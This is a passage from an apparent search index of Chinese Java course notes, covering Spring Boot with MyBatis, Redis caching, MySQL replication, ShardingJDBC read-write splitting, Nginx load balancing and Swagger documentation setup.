jdbc:mysql:///springdb?useSSL=false username: root password: root mybatis: #别名扫描，别名扫描实体类的包作用就是可以直接类名在resultType里面 type-aliases-package: com.itheima.domain configuration: #开启下划线与小驼峰映射 map-underscore-to-camel-case: true #开启sql日志记录 log-impl: org.apache.ibatis.logging.stdout.StdOutImpl #指定mapper文件所在的目录，一旦指定之后，那么xml文件可以与接口不在同一个包下了，如果不指定是需要在同一个目录下 mapper-locations: - classpath:mapper/*.xml #这里代表的是一个数组的元素，是一个整体，不需要有空格 数据访问接口注解 方式一：在接口类上使用@Mapper注解 @Mapper public interface UserDao { public List findAll(); } 方式二：在启动类上添加数据访问接口包扫描 package com.itheima; import org.mybatis.spring.annotation.MapperScan; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; /** * 注意： 使用mybatis的时候，这个springboot默认是不扫描dao接口的，两种解决方案： * 1. 每一个dao接口都添加一个@mapper注解,不推荐，因为较为繁琐 * 2. 在启动类中@MapperScan注解扫描dao包 */ @SpringBootApplication @MapperScan(basePackages = \"com.itheima.dao\") public class DemoApplication { public static void main(String[] args) { SpringApplication.run(DemoApplication.class, args); } } 整合Junit 导入test启动器依赖 org.springframework.boot spring-boot-starter-test test 编写测试类 package com.itheima.test; import com.itheima.MybatisApplication; import com.itheima.entity.User; import com.itheima.service.UserService; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; import java.util.List; /* 注意的事项： 1. 测试类如果与启动类在同一个包或者是子包，那么测试类可以不指定启动类的位置。 2. 测试类不在启动类在同一个包或者是子包，测试类必须指明启动类的位置 */ //@SpringBootTest(classes = MybatisApplication.class) //不在子包下则需要指定启动类的位置 @SpringBootTest public class AppTest { @Autowired private UserService userService; @Test public void testFindAll(){ List userList = userService.findAll(); System.out.println(\"用户列表：\"+userList); } } 项目打包部署 第一步：导入打包插件 ROOT --> org.springframework.boot spring-boot-maven-plugin 第二步：执行打包命令（需要配置maven系统变量，然后在项目路径下使用该命令） # 清理、打包 跳过测试 mvn clean package -Dmaven.test.skip=true 第三步：运行打包好的jar包 java -jar xxx.jar 多环境动态切换（profile配置） 我们在开发Spring Boot应用时，通常同一套程序会被安装到不同环境，比如：开发、测试、生产等。其中数据库地址、服务器端口等等配置都不同，如果每次打包时，都要修改配置文件，那么非常麻烦。profile功能就是来进行动态配置切换的。 多文件方式 profile文件设置（提供多个配置文件，每种文件代表一种环境） application-dev.properties/yml：开发环境 application-test.properties/yml：测试环境 application-pro.properties/yml：生产环境 激活方式：在application.properties配置文件中配置：spring.profiles.active=dev yml单文件方式 在application.yml配置文件中写上三种环境的配置信息并激活 --- server: port: 8082 spring: profiles: dev --- server: port: 8083 spring: profiles: test --- server: port: 8084 spring: profiles: pro --- # 激活配置 spring: profiles: active: test 其他激活方式 VM Options 参数：-Dspring.profiles.active=dev Program arguments参数：--spring.profiles.active=dev 命令行参数：java –jar xxx.jar --spring.profiles.active=dev Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-01-11 11:37 "},"Java笔记/Day39-Git.html":{"url":"Java笔记/Day39-Git.html","title":"Day39-Git","keywords":"","body":" Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-01-08 20:49 "},"Java笔记/Day40~45-瑞吉点餐.html":{"url":"Java笔记/Day40~45-瑞吉点餐.html","title":"Day40~45-瑞吉点餐","keywords":"","body":" Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-12-29 21:24 "},"Java笔记/Day46~47-Linux.html":{"url":"Java笔记/Day46~47-Linux.html","title":"Day46~47-Linux","keywords":"","body":"Linux版本 内核版（托瓦兹这个团队研发出来的产品我们则称作为内核版） 由Linus Torvalds及其团队开发、维护 免费、开源 负责控制硬件 发行版（基于内核版进行升级改造） 基于Linux内核版进行扩展 由各个Linux厂商开发、维护 有收费版本和免费版本 Linux目录 目录 含义 /bin 存放二进制可执行文件 /boot 存放系统引导时使用的各种文件 /dev 存放设备文件 ==/etc== 存放系统配置文件， 比如：安装完毕jdk，安装maven、配置环境变量 ==/home== 用户的主目录,存放用户的个人资料的。比如：linux是一个多用户的操作系统，创建了zhangsan用户，那么在home目录里面有zhangsan文件夹。 /lib 存放程序运行所需的共享库和内核模块 /opt 额外安装的可选应用程序包所放置的位置 ==/root== 超级管理员的主目录 /sbin 存放二进制可执行文件，只有root用户才能访问 /tmp 存放临时文件 ==/usr== 以后我们安装软件都存储在该目录中 /var 存放运行时需要改变数据的文件，例如日志文件 防火墙配置 命令 作用 systemctl start firewalld 开启 systemctl stop firewalld 关闭 systemctl enable firewalld 开机自启动==(默认状态)== systemctl disable firewalld 关闭开机自启 systemctl status firewalld 查看当前防火墙状态 firewall-cmd 参数说明 --zone=public 开放哪个网络，默认是public --add-port=端口/tcp 添加到防火墙中端口号，对外是打开的 --remove-port=端口/tcp 从防火墙的规则中删除端口号 --permanent 永久添加规则 --list-all 显示现有的规则，展示所有开放端口 --reload 重新加载规则，让新加的端口号起作用，重启防火墙的服务 systemctl restart firewalld 软件安装 安装方式 特点 二进制发布包安装 软件已经针对具体平台编译打包发布，只要解压，修改配置即可 , tomcat\\jdk rpm安装（ 软件管家） 软件已经按照redhat的包管理规范进行打包，使用rpm命令进行安装，==不能自行解决库依赖问题== yum安装 一种在线软件安装方式，本质上还是rpm安装，自动下载安装包并安装，安装过程中自动解决库依赖问题(安装过程需要联网) 源码编译安装 软件以源码工程的形式发布，需要自己编译打包 , redis Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-01-08 21:53 "},"Java笔记/Day48-Redis.html":{"url":"Java笔记/Day48-Redis.html","title":"Day48-Redis","keywords":"","body":"Redis Redis是用C语言开发的一个开源的内存中的数据结构存储系统，它可以用作：数据库、缓存和消息中间件 Redis是一款==非关系型数据库==，redis存储的数据是在==内存==中 关系型数据库（RDBMS）：MySQL、Oracle、DB2、SQLServer 非关系型数据库（Nosql）：Redis、MongoDB、MemCached Redis是一个基于内存的key-value结构数据库 基于内存存储，读写性能高 适合存储热点数据（热点商品、咨询、新闻） 能做什么 数据缓存 消息队列 注册中心 发布订阅 部署 Windows版下载地址：https://github.com/microsoftarchive/redis/releases Linux版下载地址： https://download.redis.io/releases/ Redis默认端口号为==6379== 在Linux系统安装Redis步骤： 将Redis安装包上传到Linux到soft目录 解压安装包，命令：==tar -xvf redis-4.0.0.tar.gz -C /usr/local== 安装Redis的依赖环境gcc，命令：==yum install gcc-c++== 进入 ==cd /usr/local/redis-4.0.0，进行编译，命令： make== 进入redis的src目录进行安装，命令：==make install== 进入/usr/local/redis-4.0.0 ,把redis.conf文件拷贝到src目录中 ==cp /usr/local/redis-4.0.0/redis.conf /usr/local/redis-4.0.0/src/== 修改redis.conf文件，需要修改的地方有： 修改redis.conf文件，让其在后台启动不要霸屏的方式启动， 将配置文件中的==daemonize==配置项改为yes，默认值为no reids默认是没有密码的，如果你需要有密码，将配置文件中的 ==# requirepass foobared== 配置项取消注释，默认为注释状态，foobared为密码，可以根据情况自己指定 redis的服务默认只是允许本机连接，其他机器默认情况是不被允许连接，如果允许其他机器也能连接linux的reids服务，那么需要修改==bind 127.0.0.1 你自己的linux机器的ip地址== 启动redis的服务， 使用 redis-server redis.conf 开放6379的端口号： ==firewall-cmd --zone=public --add-port=6379/tcp --permanent== 重新加载防火墙 ： ==firewall-cmd --reload== 数据类型 字符串String 哈希Hash 列表List（可重复） 集合Set（不可重复） 有序集合Sorted set / zset 常用命令 参考Redis中文网：https://www.redis.net.cn/order/ Java操作Redis 导入依赖 redis.clients jedis 2.8.0 步骤 获取连接 执行操作 关闭连接 @Test public void testJedis(){ //1. 创建Jedis，并且连接redis的服务端 Jedis jedis = new Jedis(\"192.168.65.10\",6379); //2. 添加数据 jedis.set(\"name\",\"张三\"); System.out.println(\"数据：\"+ jedis.get(\"name\")); //3. 关闭资源 jedis.close(); } Spring Data Redis 导入依赖 Mevan org.springframework.data spring-data-redis 2.4.8 SpringBoot org.springframework.boot spring-boot-starter-data-redis RedisTemplate的operation接口 ValueOperations：简单K-V操作 SetOperations：set类型数据操作 ZSetOperations：zset类型数据操作 HashOperations：针对hash类型的数据操作 ListOperations：针对list类型的数据操作 application.yml的Redis配置 spring: redis: host: 192.168.65.10 port: 6379 password: root #如果有 database: 0 #redis有16个数据库，默认是0 jedis: pool: max-active: 10 #最大链接数 max-idle: 5 #最大空闲数 min-idle: 2 #最小空闲数,触发时链接数没到最大值则增加 max-wait: 5ms #连接池最大阻塞等待时间 自定义String类型的序列化器 package com.itheima.config; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.data.redis.connection.RedisConnectionFactory; import org.springframework.data.redis.core.RedisTemplate; import org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer; import org.springframework.data.redis.serializer.StringRedisSerializer; /** * springboot帮我们创建Redistemplate的对象有两种： * 第一种就是RedisTemplate，这个对象在创建的时候是没有设置序列化器。那么默认存储到redis中的时候 * 会是jdk默认的序列化器，默认的序列化器是以字节码方式存储的。存储到Redis中的是乱码，不方便看。 * * 第二种RedisTemplate，这种key与value都设置序列号器，只不过他们序列化器，key与value都只能存放字符串类型。 * * 如果你操作的时候，你的value是java对象就不能直接使用RedisTemplate这种类型，因为你的value不是字符串类型。 * * 因此需要单独自定义设置一个配置类 * */ @Configuration public class RedisConfig { @Bean public RedisTemplate redisTemplate(RedisConnectionFactory redisConnectionFactory) { RedisTemplate template = new RedisTemplate(); template.setConnectionFactory(redisConnectionFactory); template.setKeySerializer(new StringRedisSerializer()); //设置key的序列化器 template.setValueSerializer(new GenericJackson2JsonRedisSerializer()); //设置值序列化器 return template; } } 操作数据 @SpringBootTest public class RedisTemplateTest { @Autowired private RedisTemplate redisTemplate; @Test public void testString() { ValueOperations valueOperations = redisTemplate.opsForValue(); valueOperations.set(\"name\", \"李四\"); System.out.println(\"name: \" + valueOperations.get(\"name\")); } @Test public void testHash() { //1.获取操作hash类型的客户端 HashOperations hashOperations = redisTemplate.opsForHash(); hashOperations.put(\"p1\", \"id\", 101); hashOperations.put(\"p1\", \"name\", \"张三\"); hashOperations.put(\"p1\", \"age\", 23); System.out.println(\"姓名：\" + hashOperations.get(\"p1\", \"name\")); System.out.println(\"====获取所有key====\"); Set keys = hashOperations.keys(\"p1\"); for (Object key : keys) { System.out.print(key + \",\"); } System.out.println(); System.out.println(\"====获取所有value====\"); List values = hashOperations.values(\"p1\"); for (Object value : values) { System.out.print(value + \",\"); } } @Test public void testList() { ListOperations listOperations = redisTemplate.opsForList(); listOperations.rightPushAll(\"list\", \"zhangsan\", \"lisi\"); List list = listOperations.range(\"list\", 0, -1); System.out.println(\"list集合:\" + list); System.out.println(\"size:\" + listOperations.size(\"list\")); } @Test public void testSet() { SetOperations setOperations = redisTemplate.opsForSet(); setOperations.add(\"set\", \"wangwu\", \"wangwu\", \"zhaoliu\"); Set set = setOperations.members(\"set\"); System.out.println(\"set集合\" + set); setOperations.remove(\"set\", \"wangwu\"); set = setOperations.members(\"set\"); System.out.println(\"set集合\" + set); } @Test public void testZset() { ZSetOperations zSetOperations = redisTemplate.opsForZSet(); zSetOperations.add(\"zset\", \"zhangsan\", 93); zSetOperations.add(\"zset\", \"lisi\", 94); zSetOperations.add(\"zset\", \"wangwu\", 95); Set set = zSetOperations.range(\"zset\", 0, -1); for (Object key : set) { System.out.println(key + \"=\" + zSetOperations.score(\"zset\", key) + \",\"); } zSetOperations.incrementScore(\"zset\", \"zhangsan\", 5); set = zSetOperations.range(\"zset\", 0, -1); for (Object key : set) { System.out.println(key + \"=\" + zSetOperations.score(\"zset\", key) + \",\"); } } @Test public void testCommon() { Set keys = redisTemplate.keys(\"*\"); System.out.println(\"所有的key\"); for (Object key : keys) { System.out.print(\"keys = \" + key + \",\"); } System.out.println(); System.out.println(\"是否存在这个key：\" + redisTemplate.hasKey(\"p1\")); System.out.println(\"这个key的类型：\" + redisTemplate.type(\"p1\")); redisTemplate.delete(\"p1\"); System.out.println(\"是否存在这个key：\" + redisTemplate.hasKey(\"p1\")); } } Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-01-10 17:53 "},"Java笔记/Day49~51-瑞吉点餐优化.html":{"url":"Java笔记/Day49~51-瑞吉点餐优化.html","title":"Day49~51-瑞吉点餐优化","keywords":"","body":"瑞吉点餐优化 Redis缓存 通过Redis来做缓存，从而降低数据库的访问压力，提高系统的访问性能，从而提升用户体验。加入Redis做缓存之后，我们在进行数据查询时，就需要先查询缓存，如果缓存中有数据，直接返回，如果缓存中没有数据，则需要查询数据库，再将数据库查询的结果，缓存在redis中。 方式一：Spring date redis 环境搭建 导入依赖 org.springframework.boot spring-boot-starter-data-redis 添加Redis配置 spring: redis: host: 192.168.65.10 port: 6379 password: root #如果有 database: 0 #redis有16个数据库，默认是0 jedis: pool: max-active: 10 #最大链接数 max-idle: 5 #最大空闲数 min-idle: 2 #最小空闲数,触发时链接数没到最大值则增加 max-wait: 5ms #连接池最大阻塞等待时间 添加自定义String类型的序列化器 package com.itheima.config; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.data.redis.connection.RedisConnectionFactory; import org.springframework.data.redis.core.RedisTemplate; import org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer; import org.springframework.data.redis.serializer.StringRedisSerializer; @Configuration public class RedisConfig { @Bean public RedisTemplate redisTemplate(RedisConnectionFactory redisConnectionFactory) { RedisTemplate template = new RedisTemplate(); template.setConnectionFactory(redisConnectionFactory); template.setKeySerializer(new StringRedisSerializer()); //设置key的序列化器 template.setValueSerializer(new GenericJackson2JsonRedisSerializer()); //设置值序列化器 return template; } } 功能实现 Redis缓存设置验证码有效期（redisTemplate实现） 在UserController中注入RedisTemplate对象，用于操作Redis @Autowired private RedisTemplate redisTemplate; 在UserController的sendMsg方法中，将生成的验证码保存到Redis //session.setAttribute(phone,code);//原代码 //手机号作为key，验证码作为值 ValueOperations valueOperations = redisTemplate.opsForValue(); //验证码存储在redis中，并且设置过期时间1分钟 valueOperations.set(phone,code,1, TimeUnit.MINUTES); 登录成功后清除验证码 //session.removeAttribute(userPhone);//原代码 redisTemplate.delete(userPhone); Redis缓存菜品信息（redisTemplate实现） 在DishServiceImpl中注入RedisTemplate @Autowired private RedisTemplate redisTemplate; 在list方法中,查询数据库之前,先查询缓存, 缓存中有数据, 直接返回 /** * 在添加dishDtiList时，采用字符串拼接的形式，创建了一个名称空间，方便管理 */ @Override public R list(Long categoryId, Integer status) { //向Redis查询是否存在该类菜品dishDtoList ValueOperations valueOperations = redisTemplate.opsForValue(); List dishDtoList = (List) valueOperations.get(\"dish:\" + categoryId + \"_\" + status); //如果redis没有这类菜品，则查询数据库得到 if (dishDtoList == null) { List dishList = dishDao.list(categoryId, status); //将Dish转换为DishDto dishDtoList = dishList.stream().map(dish -> { DishDto dishDto = new DishDto(); BeanUtils.copyProperties(dish, dishDto); //查询口味信息并传入dishDto List flavorList = dishFlavorDao.findByDishId(dish.getId()); dishDto.setFlavors(flavorList); return dishDto; }).collect(Collectors.toList()); //数据库查询到的结果保存到Redis中 valueOperations.set(\"dish:\" + categoryId + \"_\" + status,dishDtoList); } return R.success(dishDtoList); } 当菜品信息出现修改时，需要清空缓存数据（如果只是清除单个菜品的缓存，那么如果用户修改了菜品的分类，那么原来分类下将少一个菜品，新的分类下将多一个菜品；因此更新完毕后，需要清除redis的所有菜品缓存） //因此在save方法和update方法需要添加如下代码 //更新完毕后，需要清除redis的所有菜品缓存 Set keys = redisTemplate.keys(\"dish:*\"); redisTemplate.delete(keys); 方式二：Spring Cache 介绍 Spring Cache是一个框架，实现了==基于注解==的缓存功能。CacheManager是Spring提供的各种缓存技术抽象接口。 CacheManager 描述 EhCacheCacheManager 使用EhCache作为缓存技术 GuavaCacheManager 使用Google的GuavaCache作为缓存技术 RedisCacheManager 使用Redis作为缓存技术 spring 自己也搞了一套缓存技术，默认的缓存。spring缓存是缓存在Map集合中 注解说明 注解 说明 @EnableCaching 启动类上使用，开启缓存注解功能 @Cacheable 在方法执行前spring会先查看缓存中是否有数据，如果有数据，则直接返回缓存数据；如果没有数据，再调用方法并将==方法返回值==存入缓存中 @CachePut 将方法的返回值放到缓存中 @CacheEvict 将一条或多条数据从缓存中删除 通用注解属性： value：缓存的名称，每个缓存名称下面可以有多个key key：缓存的key（SPEL语法） 写法一：使用形参数据#user.id #user指的是方法形参的名称，id指的是user的id属性，也就是使用user的id属性作为key 写法二：使用返回值数据#result.id #result代表方法返回值，表示以返回对象的id属性作为key @Cacheable注解 注意： 默认情况方法的返回值是一个null的时候也是会生成缓存的，这样子是没有意义的 解决方案： condition属性：符合条件则生成缓存【注意：condition属性值不能访问result结果的】 unless属性：符合条件不生成缓存 @GetMapping(\"/{id}\") @Cacheable(value = \"user\",key = \"#id\",unless = \"#result==null\") public User getById(@PathVariable Long id){ User user = userService.findById(id); return user; } @CacheEvict注解 注意：使用allEntries = true清除该名称空间下面的所有数据 环境搭建 导入依赖 org.springframework.boot spring-boot-starter-cache org.springframework.boot spring-boot-starter-data-redis 添加Redis配置 spring: redis: host: 192.168.65.10 port: 6379 password: root #如果有 database: 0 #redis有16个数据库，默认是0 jedis: pool: max-active: 10 #最大链接数 max-idle: 5 #最大空闲数 min-idle: 2 #最小空闲数,触发时链接数没到最大值则增加 max-wait: 5ms #连接池最大阻塞等待时间 cache: redis: time-to-live: 1800000 #设置存活时间，半小时 添加自定义String类型的序列化器 （略） 在启动类上加入@EnableCaching注解，开启缓存注解功能 @Slf4j//通过slf4j记录日志 @SpringBootApplication @MapperScan(basePackages = \"com.itheima.reggie.dao\")//指定要变成实现类的接口所在的包 @ServletComponentScan(basePackages = \"com.itheima.reggie.filter\") @EnableCaching//开启Spring Cache注解方式（缓存功能） public class ReggieApplication { public static void main(String[] args) { SpringApplication.run(ReggieApplication.class,args); log.info(\"瑞吉项目启动成功~\"); } } 功能实现 在SetmealServiceImpl的list方法上加入@Cacheable注解 @Override @Cacheable(value = \"setmeal\", key = \"#categoryId+'_'+#status\", unless = \"#result==null\")//注意： 如果是多个参数作为key，语法： #参数一+'_'+#参数2 public R list(Long categoryId, Integer status) { //根据分类id查询套餐 List setmealList = setmealDao.list(categoryId,status); return R.success(setmealList); } 在save和delete方法上加注解@CacheEvict @CacheEvict(value = \"setmeal\",allEntries = true) 两种方式的对比 Spring date redis 优点： 可以精准控制每一个key的有效时间 可以让一个方法的任何数据成为缓存 缺点： 使用起来相对麻烦，需要编码 SpringCache 优点： 使用方便，不需要编码，通过注解即可实现缓存操作 缺点： 只能对有效时间进行全局配置，不能把控每一个key的有效时间 只能将方法的返回值进行缓存 读写分离 只有一台MySQL服务器时，存在以下问题： 1.读和写所有压力都由一台数据库承担，压力大 2.数据库服务器磁盘损坏则数据丢失，单点故障 因此可以准备两台MySQL，一台主(Master)服务器，一台从(Slave)服务器，主库的数据变更（写、更新、删除这些操作），需要同步到从库中(主从复制)。而用户在访问我们项目时，如果是写操作(insert、update、delete)，则直接操作主库；如果是读(select)操作，则直接操作从库(在这种读写分离的结构中，从库是可以有多个的)，这种结构我们称为读写分离 MySQL主从复制 MySQL主从复制是一个异步的复制过程，底层是基于Mysql数据库自带的 二进制日志 功能。就是一台或多台MySQL数据库（slave，即从库）从另一台MySQL数据库（master，即主库）进行日志的复制，然后再解析日志并应用到自身，最终实现 从库 的数据和 主库 的数据保持一致。 二进制日志： ​ 二进制日志（BINLOG）记录了所有的 DDL（数据定义语言）语句和 DML（数据操纵语言）语句，但是不包括数据查询语句。此日志对于灾难时的数据恢复起着极其重要的作用，MySQL的主从复制， 就是通过该binlog实现的。默认MySQL是未开启该日志的。 MySQL主从复制步骤： MySQL主库master将数据变更记录写入二进制日志（binary log） 从库slave将主库master的binary log复制到它的中继日志（relay log） 从库slave重做中继日志中的事件，将数据变更反映到它自己的数据中 环境搭建 准备两台关闭了防火墙并启动mysql的服务器 主库配置 修改mysql配置文件vim /etc/my.cnf # 在[mysqld]下面增加以下配置 log-bin=mysql-bin #[必须]启用二进制日志 server-id=10 #[必须]服务器唯一ID(唯一即可) 重启mysql服务systemctl restart mysqld 登录mysql，创建一个专门给从库用于同步数据的用户 GRANT REPLICATION SLAVE ON *.* to '用户名'@'%' identified by '密码'; /* mysql5.7默认密码校验策略等级为 MEDIUM , 该等级要求密码组成为: 数字、小写字母、大写字母 、特殊字符、长度至少8位 */ 登录mysql，查看同步状态show master status;，记录File和Position的值 ==注：上面SQL的作用是查看Master的状态，执行完此SQL后不要再执行任何操作== 从库配置 修改mysql配置文件vim /etc/my.cnf # 在[mysqld]下面增加以下配置 log-bin=mysql-bin #[必须]启用二进制日志 server-id=11 #[必须]服务器唯一ID(唯一即可) vim /var/lib/mysql/auto.cnf：==注意： 由于linux 是克隆出来的，mysql中还有一个server_uuid是一样的，也需要修改== 重启mysql服务systemctl restart mysqld 登录mysql，设置主库地址和同步位置 stop slave; change master to master_host='主库的ip地址',master_user='主库创建的用户名',master_password='主库的密码',master_log_file='主库的日志文件',master_log_pos=主库的同步位置; start slave; 登录mysql，确认从库状态是否正常show slave status\\G;，若失败则重复上一步 ShardingJDBC 使用Sharding-JDBC可以轻松实现数据库读写分离 特点： 适用于任何基于JDBC和ORM框架，如：JPA、Hibernate、Mybatis、Spring JDBC Template或直接使用JDBC 支持任何第三方的数据库连接池，如：DBCP, C3P0, BoneCP, Druid, HikariCP等 支持任意实现JDBC规范的数据库，如：MySQL，Oracle，SQLServer，PostgreSQL以及任何遵循SQL92标准的数据库 环境搭建 导入依赖 org.apache.shardingsphere sharding-jdbc-spring-boot-starter 4.0.0-RC1 配置shardingjdbc数据源 spring: shardingsphere: datasource: names: master,slave # 这里数据源名字是可以随便修改，但是一定要与下面配置要对应 # 主数据源 master: type: com.alibaba.druid.pool.DruidDataSource driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://192.168.65.10:3306/reggie?characterEncoding=utf-8&useSSL=false username: root password: root # 从数据源 slave: type: com.alibaba.druid.pool.DruidDataSource driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://192.168.65.11:3306/reggie?characterEncoding=utf-8&useSSL=false username: root password: root masterslave: # 读写分离配置 load-balance-algorithm-type: round_robin # 从库负载均衡策略使用轮询 # 最终的数据源名称（存储在Spring容器中的名字） name: dataSource # 主库数据源名称 master-data-source-name: master # 从库数据源名称列表（多个使用逗号分割） slave-data-source-names: slave props: sql: show: true #开启SQL显示，默认false main: # 允许sharedingjdbc数据源去覆盖druid数据源(后面创建数据源会覆盖前面创建的数据源) allow-bean-definition-overriding: true Nginx Nginx是一款轻量级的Web服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器。其特点是占有内存少，并发能力强 介绍 作用 发布静态资源 用做服务器反向代理，实现服务器集群负载均衡 做为邮件代理服务器 安装 需要提前安装C语言的编译环境，及正则表达式库等第三方依赖库 yum -y install gcc pcre-devel zlib-devel openssl openssl-devel 下载Nginx安装包 yum install wget wget https://nginx.org/download/nginx-1.16.1.tar.gz 解压 tar -xvf nginx-1.16.1.tar.gz 配置编译环境（--prefix 指定安装目录） cd nginx-1.16.1 ./configure --prefix=/usr/local/nginx 编译&安装 make & make install 目录结构 目录/文件 说明 conf 配置文件的存放目录 conf/nginx.conf Nginx的核心配置文件 html 存放静态资源(html, css, ) logs 存放nginx日志(访问日志、错误日志等) sbin/nginx 二进制文件，用于启动、停止Nginx服务 常用命令 首先vim /etc/profile，添加nginx全局环境变量，然后重新加载source /etc/profile 常用命令 | 命令 | 说明 | | --------------- | ---------------------- | | nginx -v | 查看版本 | | nginx -t | 检查配置文件是否有错误 | | nginx | 启动nginx | | nginx -s stop | 关闭nginx | | nginx -s reload | 重新加载 | Nginx配置文件 nginx的配置文件（conf/niginx.conf）整体上分为三部分：全局块，events块、http块。 | 区域 | 职责 | | -------- | ---------------------------------------- | | 全局块 | 配置和nginx运行相关的全局配置 | | events块 | 配置和网络连接相关的配置 | | http块 | 配置代理、缓存、日志记录、虚拟主机等配置 | server块 server { listen 80; #监听端口 server_name localhost; #服务器名称 location / { #匹配客户端请求url root html; #指定静态资源根目录 index index.html; #指定默认首页 } } 反向代理 正向代理：客户端向代理服务器发送一个请求，并且指定目标服务器，之后代理服务器向目标服务器转发请求，并将获得的内容返回给客户端 反向代理：代理服务器接收客户端的请求，然后将请求转发给内部网络上的服务器，将从服务器上得到的结果返回给客户端 不同点： 正向代理是客户端的代理，服务器不知道真正的客户端是谁；反向代理是服务器的代理，客户端不知道真正的服务器是谁 正向代理一般是客户端架设的；反向代理一般是服务器架设的 正向代理主要是用来解决访问限制问题；反向代理则是提供负载均衡、安全防护等作用。二者都能提高访问速度 环境搭建 修改Nginx配置文件 #当访问nginx的80端口时，根据反向代理配置，会将请求转发到 http://192.168.65.11:8080 对应的服务上 server { listen 80; #监听本机被访问端口 server_name localhost; location / { proxy_pass http://192.168.65.11:8080; #反向代理配置，将监听到的请求转发给指定服务器 } } 检查配置文件，并重新加载 nginx -t nginx -s reload 负载均衡 应用集群：将同一应用部署到多台机器上，组成应用集群，接收负载均衡器分发的请求，进行业务处理并返回响应数据 负载均衡器：将用户请求根据对应的负载均衡算法分发到应用集群中的一台服务器进行处理 环境搭建 修改Nginx配置文件 #upstream可以定义一组集群服务器 upstream targetserver{ server 192.168.65.11:8080; server 192.168.65.11:8081; } server { listen 80; #监听本机被访问端口 server_name localhost; location / { proxy_pass http://targetserver; #将监听到的请求转发给集群服务器 } } 检查配置文件，并重新加载 nginx -t nginx -s reload 负载均衡策略 名称 说明 特点 缺点 round_robin 轮询 默认方式 weight 权重方式 根据权重分发请求,权重大的分配到请求的概率大 ip_hash 依据ip分配 根据客户端请求的IP地址计算hash值， 根据hash值来分发请求, 同一个IP发起的请求, 会发转发到同一个服务器上 将IP与服务器绑死了 least_conn 依据最少连接 哪个服务器当前处理的连接少, 请求优先转发到这台服务器 没有考虑服务器性能 url_hash 依据url分配 根据客户端请求url的hash值，来分发请求, 同一个url请求, 会发转发到同一个服务器上 容易把负载高的请求集中到一台服务器上 fair 依据响应时间 优先把请求分发给处理请求时间短的服务器 最终会导致性能下降，还是不如前两种策略 权重方式的配置 #在大数据量的请求下，最终8080接收的请求数是8081的两倍 upstream targetserver{ server 192.168.65.11:8080 weight=2; server 192.168.65.11:8081 weight=1; } 接口文档 接口文档是指定义了接口的请求路径、请求方式、请求参数、响应数据等信息的开发文档。 Yapi YApi 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。 官方文档：https://hellosean1025.github.io/yapi/ Swagger & knife4j Swagger 是一个规范和完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。 官网：https://swagger.io/ 直接使用Swagger, 需要按照Swagger的规范定义接口, 实际上就是编写Json文件，编写起来比较繁琐、并不方便, 。而在项目中使用，我们一般会选择一些现成的框架来简化文档的编写，而这些框架是基于Swagger的，如使用knife4j框架，来自动生成接口文档。 环境搭建 导入依赖 com.github.xiaoymin knife4j-spring-boot-starter 3.0.2 导入knife4j相关配置 在WebMvcConfig配置类中，添加@EnableSwagger2和@EnableKnife4j注解，开启Swagger和Knife4j的功能。 在配置类中声明一个Docket类型的bean，通过该bean指定生成文档的信息。 package com.itheima.reggie.config; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.http.converter.HttpMessageConverter; import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter; import org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; import springfox.documentation.builders.ApiInfoBuilder; import springfox.documentation.builders.PathSelectors; import springfox.documentation.builders.RequestHandlerSelectors; import springfox.documentation.service.ApiInfo; import springfox.documentation.spi.DocumentationType; import springfox.documentation.spring.web.plugins.Docket; import java.util.List; @Configuration @EnableSwagger2 @EnableKnife4j public class WebMvcConfig implements WebMvcConfigurer { /** * 因为我们的静态资源并没有存放在springboot指定的四个目录里面 * 分别是：META-INF/resource、/resource、/public、/static * 因此需要设置静态资源映射 */ @Override public void addResourceHandlers(ResourceHandlerRegistry registry) { registry.addResourceHandler(\"/backend/**\").addResourceLocations(\"classpath:/backend/\"); registry.addResourceHandler(\"/front/**\").addResourceLocations(\"classpath:/front/\"); //由于Swagger生成的在线文档中，涉及到很多静态资源，这些静态资源需要添加静态资源映射 registry.addResourceHandler(\"doc.html\").addResourceLocations(\"classpath:/META-INF/resources/\"); registry.addResourceHandler(\"/webjars/**\").addResourceLocations(\"classpath:/META-INF/resources/webjars/\"); } @Override public void extendMessageConverters(List> converters) { //创建一个消息转换器 MappingJackson2HttpMessageConverter messageConverter = new MappingJackson2HttpMessageConverter(); //把消息转换器底层依赖的objectMapper添加到消息转换器上 messageConverter.setObjectMapper(new JacksonObjectMapper()); //把自定义的消息转换器添加到springmvc的消息转换器的集合里 converters.add(0,messageConverter);//指定索引为0，优先使用自定义的消息转换器 } @Bean public Docket createRestApi() { // 文档类型 return new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo()) .select() .apis(RequestHandlerSelectors.basePackage(\"com.itheima.reggie.controller\"))//接口文档基于controller包去扫描 .paths(PathSelectors.any()) .build(); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title(\"瑞吉外卖\") .version(\"1.0\") .description(\"瑞吉外卖接口文档\") .build(); } } 设置拦截器放行规则 \"/doc.html\", \"/webjars/**\", \"/swagger-resources\", \"/v2/api-docs\" 